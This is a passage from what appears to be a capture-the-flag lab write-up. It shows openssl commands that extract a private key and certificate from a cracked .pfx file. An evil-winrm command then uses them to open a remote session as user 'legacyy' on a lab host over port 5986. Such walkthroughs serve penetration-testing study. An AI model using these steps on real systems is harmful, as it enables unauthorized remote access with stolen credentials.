The extracted password of `legacyy_dev_auth.pfx` can be used to extract .key and .crt file 
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
```

```bash
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

This .key and .crt file can be used to log in as `legacyy` on the system over port 5986 that allows for SSL windows remote management
```bash
evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```
